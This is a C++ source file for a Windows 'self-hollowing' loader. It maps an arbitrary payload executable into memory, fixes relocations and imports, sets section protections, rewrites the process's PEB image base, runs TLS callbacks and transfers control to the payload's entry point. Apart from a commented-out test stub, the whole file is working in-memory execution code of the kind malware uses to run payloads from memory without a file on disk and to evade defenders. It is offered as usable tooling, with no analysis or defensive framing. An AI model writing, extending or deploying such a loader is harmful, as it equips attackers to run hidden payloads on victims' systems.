// selfhollow_strict.cpp
// Hardened self‑hollowing loader with relocation, import resolution, TLS support, and per‑section protection
#include "selfhollow.h"
#include "applyReloc.h"
#include <winnt.h>
#include <winternl.h>
#include <stdio.h>
#include <vector>
#include <string>

// Updated logging macros to reduce verbosity
#define LOG(fmt, ...)  do { /* Only enable for debug: printf("[*] " fmt "\n", ##__VA_ARGS__); fflush(stdout); */ } while(0)
#define ERR(fmt, ...)  do { fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__); fflush(stdout); } while(0)
#define INFO(fmt, ...) do { printf("[+] " fmt "\n", ##__VA_ARGS__); fflush(stdout); } while(0)


static DWORD SectionProtection(DWORD characteristics) {
    DWORD protect = PAGE_NOACCESS;
    bool exec  = characteristics & IMAGE_SCN_MEM_EXECUTE;
    bool write = characteristics & IMAGE_SCN_MEM_WRITE;
    bool read  = characteristics & IMAGE_SCN_MEM_READ;

    if (!exec && !write && read) protect = PAGE_READONLY;
    else if (!exec && write && read) protect = PAGE_READWRITE;
    else if (exec && !write && read) protect = PAGE_EXECUTE_READ;
    else if (exec && write && read) protect = PAGE_EXECUTE_READWRITE;
    return protect;
}

static bool BoundsCheck(const void* base, size_t size, const void* ptr, size_t need) {
    size_t offset = (const unsigned char*)ptr - (const unsigned char*)base;
    return offset + need <= size;
}

static bool ResolveImports(BYTE* imageBase, size_t imageSize) {
    auto dos = (IMAGE_DOS_HEADER*)imageBase;
    auto nt  = (IMAGE_NT_HEADERS*)(imageBase + dos->e_lfanew);
    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (dir.VirtualAddress == 0 || dir.Size == 0) return true; // none

    auto importDesc = (IMAGE_IMPORT_DESCRIPTOR*)(imageBase + dir.VirtualAddress);
    while (importDesc->Name) {
        char* dllName = (char*)(imageBase + importDesc->Name);
        HMODULE hDll = LoadLibraryA(dllName);
        if (!hDll) { ERR("LoadLibrary failed for %s", dllName); return false; }

        IMAGE_THUNK_DATA* thunkILT = (IMAGE_THUNK_DATA*)(imageBase + importDesc->OriginalFirstThunk);
        IMAGE_THUNK_DATA* thunkIAT = (IMAGE_THUNK_DATA*)(imageBase + importDesc->FirstThunk);

        // If there is no ILT, use IAT as both
        if (!importDesc->OriginalFirstThunk) thunkILT = thunkIAT;

        for (; thunkILT->u1.AddressOfData; ++thunkILT, ++thunkIAT) {
            FARPROC func = nullptr;
            if (thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                WORD ord = (WORD)(thunkILT->u1.Ordinal & 0xFFFF);
                func = GetProcAddress(hDll, MAKEINTRESOURCEA(ord));
            } else {
                IMAGE_IMPORT_BY_NAME* impByName = (IMAGE_IMPORT_BY_NAME*)(imageBase + thunkILT->u1.AddressOfData);
                func = GetProcAddress(hDll, impByName->Name);
            }
            if (!func) {
                ERR("GetProcAddress failed in %s", dllName);
                return false;
            }
            thunkIAT->u1.Function = (ULONGLONG)func;
        }
        ++importDesc;
    }
    return true;
}

static bool CallTLSCallbacks(BYTE* imageBase) {
    auto dos = (IMAGE_DOS_HEADER*)imageBase;
    auto nt  = (IMAGE_NT_HEADERS*)(imageBase + dos->e_lfanew);
    auto &dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (dir.VirtualAddress == 0) return true;

    auto tlsDir = (IMAGE_TLS_DIRECTORY*)(imageBase + dir.VirtualAddress);
    PIMAGE_TLS_CALLBACK* cb = (PIMAGE_TLS_CALLBACK*)tlsDir->AddressOfCallBacks;
    if (!cb) return true;
    while (*cb) {
        (*cb)(imageBase, DLL_PROCESS_ATTACH, nullptr);
        ++cb;
    }
    return true;
}

// Original SelfHollowStrict - modified for safer execution
bool SelfHollowStrict(unsigned char* payload, size_t payload_size) {
    INFO("Initializing self-hollowing process");
    
    if (!payload || payload_size < sizeof(IMAGE_DOS_HEADER)) { 
        ERR("Invalid payload pointer or size too small");
        return false; 
    }

    // Validate PE headers with bounds
    auto dos = (IMAGE_DOS_HEADER*)payload;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { ERR("Invalid DOS signature"); return false; }
    
    if (dos->e_lfanew == 0 || dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > payload_size) { 
        ERR("Invalid NT header location");
        return false; 
    }
    auto nt = (IMAGE_NT_HEADERS*)(payload + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { ERR("Invalid NT signature"); return false; }

    // Extract PE header information
    void* preferredBaseVoid = (void*)nt->OptionalHeader.ImageBase;
    size_t imageSize = (size_t)nt->OptionalHeader.SizeOfImage;
    BYTE* preferredBase = (BYTE*)preferredBaseVoid;

    // PHASE 1: First allocate memory for the new image
    INFO("Allocating memory for payload image");
    BYTE* newBase = (BYTE*)VirtualAlloc(NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!newBase) {
        ERR("Memory allocation failed: error 0x%lX", GetLastError());
        return false;
    }

    // Copy PE headers
    memcpy(newBase, payload, nt->OptionalHeader.SizeOfHeaders);

    // Copy sections
    INFO("Copying PE sections");
    auto sect = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sect) {
        if (sect->SizeOfRawData == 0) {
            continue;
        }
        if (!BoundsCheck(payload, payload_size, payload + sect->PointerToRawData, sect->SizeOfRawData)) {
            ERR("Section %d ('%.8s') raw data out of bounds", i, (char*)sect->Name);
            VirtualFree(newBase, 0, MEM_RELEASE);
            return false;
        }
        void* dest = newBase + sect->VirtualAddress;
        void* src  = payload + sect->PointerToRawData;
        memcpy(dest, src, sect->SizeOfRawData);
    }

    // Relocate if needed
    if (newBase != preferredBase) {
        INFO("Applying relocations");
        if (!applyReloc((uint64_t)newBase, (uint64_t)preferredBase, newBase, imageSize)) {
            ERR("Relocation failed");
            VirtualFree(newBase, 0, MEM_RELEASE);
            return false;
        }
    }

    // Resolve imports
    INFO("Resolving imports");
    if (!ResolveImports(newBase, imageSize)) { 
        ERR("Import resolution failed"); 
        VirtualFree(newBase, 0, MEM_RELEASE);
        return false;
    }

    // Protect sections according to characteristics
    INFO("Setting memory protections");
    sect = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sect) {
        DWORD protect = SectionProtection(sect->Characteristics);
        DWORD old;
        if (!VirtualProtect(newBase + sect->VirtualAddress, sect->Misc.VirtualSize, protect, &old)) {
            ERR("Memory protection failed for section '%.8s'", (char*)sect->Name);
            VirtualFree(newBase, 0, MEM_RELEASE);
            return false;
        }
    }

    // Update PEB ImageBaseAddress to point to the new base before unmapping
    PTEB teb = (PTEB)NtCurrentTeb();
    PPEB peb = teb->ProcessEnvironmentBlock;
#ifdef _WIN64
    *(PVOID*)((PBYTE)peb + 0x10) = (PVOID)newBase;
#else
    *(PVOID*)((PBYTE)peb + 0x08) = (PVOID)newBase;
#endif

    // TLS Callbacks
    if (!CallTLSCallbacks(newBase)) { 
        ERR("TLS callbacks failed"); 
        VirtualFree(newBase, 0, MEM_RELEASE);
        return false; 
    }

    // Flush instruction cache
    FlushInstructionCache(GetCurrentProcess(), newBase, imageSize);

    // Extract the entry point address
    void (*entryPoint)() = (void(*)())(newBase + nt->OptionalHeader.AddressOfEntryPoint);
    
    if (entryPoint == NULL) {
        ERR("Entry point is NULL");
        VirtualFree(newBase, 0, MEM_RELEASE);
        return false;
    }
    
    INFO("Executing payload at entry point");
    entryPoint(); // This should transfer control to the new executable

    // This code should not be reached if the payload properly executes
    ERR("Execution returned from payload entry point");
    return true;
}

/*
// Simplified test function
bool SelfHollowStrict_Test(void) {
    LOG("SelfHollowStrict_Test entered successfully!");
    return true; 
}
*/